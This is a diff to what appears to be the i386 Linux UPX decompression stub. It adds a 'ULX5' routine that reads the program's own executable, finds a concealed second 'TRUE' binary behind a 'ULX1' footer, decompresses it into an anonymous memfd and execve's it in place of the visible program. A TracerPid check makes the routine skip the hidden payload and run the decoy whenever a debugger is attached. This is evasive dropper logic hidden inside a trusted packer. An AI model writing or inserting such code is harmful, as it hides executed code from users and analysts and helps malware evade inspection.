@@ -50,6 +50,8 @@ extern ssize_t write(int, void const *, size_t);
 extern int munmap(void *, size_t);
 extern int close(int);
 extern void exit(int code) __attribute__ ((__noreturn__));
+extern int ftruncate(int, size_t);
+extern int execve(char const *, char **, char **);
 #  define mmap_privanon(addr,len,prot,flgs) mmap((addr),(len),(prot), \
         MAP_PRIVATE|MAP_ANONYMOUS|(flgs),-1,0)
 
@@ -92,6 +94,74 @@ extern void my_bkpt(void const *, ...);
 #else  //}{
 #error;
 #endif  //}
+
+#if defined(__i386__)
+static int is_debugger_present(void) {
+    int fd = open(addr_string("/proc/self/status"), O_RDONLY, 0);
+    int i, j, n;
+    char buf[1024];
+    const char *target;
+    if (fd < 0) return 0;
+    n = read(fd, buf, sizeof(buf) - 1);
+    close(fd);
+    if (n <= 10) return 0;
+    buf[n] = 0;
+    target = addr_string("TracerPid:");
+    for (i = 0; i < n - 10; i++) {
+        int match = 1;
+        for (j = 0; j < 10; j++) {
+            if (buf[i + j] != target[j]) {
+                match = 0;
+                break;
+            }
+        }
+        if (match) {
+            const char *p = &buf[i + 10];
+            while (*p == ' ' || *p == '\t') p++;
+            return (*p != '0');
+        }
+    }
+    return 0;
+}
+
+#define ULX_READ_CHUNK 4096u
+#define ULX_READ_INIT  131072u
+#define ULX_READ_MAX   (16u*1024u*1024u)
+
+static void ulx5_argv_envp_from_auxv(Elf32_auxv_t const *av, char ***argv, char ***envp)
+{
+    char **e = (char **) (unsigned long) av;
+    --e;
+    while (*(e - 1))
+        --e;
+    *envp = e;
+    --e;
+    while (*(e - 1))
+        --e;
+    *argv = e;
+}
+
+static int ulx5_proc_fd_path(int fd, char *path)
+{
+    char const *const prefix = addr_string("/proc/self/fd/");
+    char *q = path;
+    char const *s = prefix;
+    while (*s)
+        *q++ = *s++;
+    if (fd >= 100) {
+        *q++ = (char) ('0' + (fd / 100) % 10);
+        fd %= 100;
+    }
+    if (fd >= 10) {
+        *q++ = (char) ('0' + (fd / 10) % 10);
+        fd %= 10;
+    }
+    *q++ = (char) ('0' + fd);
+    *q = 0;
+    return (int)(q - path);
+}
+#endif
+
 #if !DEBUG //{
 #define DPRINTF(fmt, args...) /*empty*/
 #else  //}{
@@ -765,6 +835,135 @@ upx_main2(  // returns entry address
     xo.size = bi->sz_unc;  // can require bi aligned(4)
     xi2.buf = CONST_CAST(char *, bi); xi2.size = bi->sz_cpr + sizeof(*bi);
     xi1.buf = CONST_CAST(char *, bi); xi1.size = sz_compressed;
+
+#if defined(__i386__)
+    // ULX5: anti-debug + hidden TRUE binary from /proc/self/exe
+    {
+        char const *const exe = addr_string("/proc/self/exe");
+        int const fd = open(exe, O_RDONLY, 0);
+        if (fd >= 0) {
+            unsigned cap = ULX_READ_INIT;
+            char *filebuf = (char *)mmap(0, cap, PROT_READ|PROT_WRITE,
+                MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+            if ((long)filebuf != -1) {
+                unsigned total = 0;
+                for (;;) {
+                    if (total + ULX_READ_CHUNK > cap) {
+                        if (cap >= ULX_READ_MAX)
+                            break;
+                        unsigned ncap = cap * 2;
+                        if (ncap > ULX_READ_MAX)
+                            ncap = ULX_READ_MAX;
+                        char *nbuf = (char *)mmap(0, ncap, PROT_READ|PROT_WRITE,
+                            MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+                        if ((long)nbuf < 0)
+                            break;
+                        {
+                            unsigned k = total;
+                            char *d = nbuf;
+                            char *s = filebuf;
+                            while (k--)
+                                *d++ = *s++;
+                        }
+                        munmap(filebuf, cap);
+                        filebuf = nbuf;
+                        cap = ncap;
+                    }
+                    long n = read(fd, filebuf + total, ULX_READ_CHUNK);
+                    if (n <= 0)
+                        break;
+                    total += (unsigned) n;
+                }
+                close(fd);
+
+                // Check for nodbg flag in UPX pack header (at end of file)
+                int debugger_found = 0;
+                if (total > 32) {
+                    unsigned j = total - 8;
+                    unsigned search_start = (total > 4096) ? total - 4096 : 0;
+                    while (j >= search_start) {
+                        if (filebuf[j]=='U' && filebuf[j+1]=='P' && filebuf[j+2]=='X'
+                        &&  filebuf[j+3]=='!') {
+                            unsigned char level = (unsigned char)filebuf[j + 7];
+                            DPRINTF("ULX5: pack header at %%x level=%%x\\n", j, level);
+                            if (level & 128) {
+                                debugger_found = is_debugger_present();
+                                DPRINTF("ULX5: debugger_found=%%d\\n", debugger_found);
+                            }
+                            break;
+                        }
+                        if (j == 0) break;
+                        --j;
+                    }
+                }
+
+                char *ulx_footer = 0;
+                unsigned j;
+                if (!debugger_found && total >= 36) {
+                    j = total;
+                    do {
+                        --j;
+                        if (filebuf[j]=='U' && filebuf[j+1]=='L' && filebuf[j+2]=='X'
+                        &&  filebuf[j+3]=='1') {
+                            ulx_footer = filebuf + j;
+                            break;
+                        }
+                    } while (j >= 36);
+                }
+                if (ulx_footer != 0) {
+                    nrv_byte const *binfo = (nrv_byte const *)(ulx_footer + 24);
+                    unsigned true_u_len = (unsigned)binfo[0] | ((unsigned)binfo[1] << 8)
+                                        | ((unsigned)binfo[2] << 16) | ((unsigned)binfo[3] << 24);
+
+                    char *true_buf = (char *)mmap(0, true_u_len, PROT_READ|PROT_WRITE,
+                        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+                    if ((long)true_buf == -1) err_exit(30);
+
+                    size_t out_len = true_u_len;
+                    int r = f_expand(binfo, (nrv_byte *)true_buf, &out_len);
+                    munmap(filebuf, cap);
+                    if (r != 0) err_exit(31);
+
+                    {
+                        // memfd_create syscall (356 on i386)
+                        int mfd;
+                        asm volatile("int $0x80" : "=a"(mfd)
+                            : "a"(356), "b"(addr_string("upx")), "c"(MFD_EXEC));
+                        if (mfd < 0) err_exit(36);
+                        if (0 > ftruncate(mfd, true_u_len)) err_exit(37);
+                        {
+                            char *p = true_buf;
+                            unsigned remain = true_u_len;
+                            while (remain) {
+                                size_t const chunk = remain > 4096 ? 4096 : remain;
+                                size_t nw = write(mfd, p, chunk);
+                                if ((long)nw <= 0) err_exit(38);
+                                p += nw;
+                                remain -= (unsigned) nw;
+                            }
+                        }
+                        munmap(true_buf, true_u_len);
+
+                        char fdpath[32];
+                        ulx5_proc_fd_path(mfd, fdpath);
+                        char *xargv[2];
+                        char **envp = 0;
+                        char **dummy = 0;
+                        xargv[0] = fdpath;
+                        xargv[1] = 0;
+                        ulx5_argv_envp_from_auxv(av, &dummy, &envp);
+                        execve(fdpath, xargv, envp);
+                        close(mfd);
+                        err_exit(40);
+                    }
+                }
+                munmap(filebuf, cap);
+            } else {
+                close(fd);
+            }
+        }
+    }
+#endif
 
     // ehdr = Uncompress Ehdr and Phdrs
     unpackExtent(&xi2, &xo);  // never filtered?
